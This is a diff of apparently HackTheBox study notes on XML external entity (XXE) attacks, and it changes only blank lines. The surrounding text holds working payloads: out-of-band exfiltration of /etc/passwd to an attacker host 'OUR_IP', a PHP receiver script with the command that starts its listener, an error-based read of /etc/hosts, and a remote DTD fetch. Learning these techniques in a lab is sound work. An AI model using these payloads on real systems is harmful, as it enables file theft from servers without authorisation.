@@ -47,6 +47,7 @@ Finally, the attacker must submit the following XXE payload to the vulnerable ap
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 ```
+
 ```php
 <?php
 if(isset($_GET['content'])){
@@ -54,12 +55,14 @@ if(isset($_GET['content'])){
 }
 ?>
 ```
+
 ```shell-session
 alakin2504@htb[/htb]$ vi index.php # here we write the above PHP code
 alakin2504@htb[/htb]$ php -S 0.0.0.0:8000
 
 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
 ```
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [ 
@@ -81,6 +84,7 @@ PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
+
 ```xml
 <!DOCTYPE foo [ 
   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
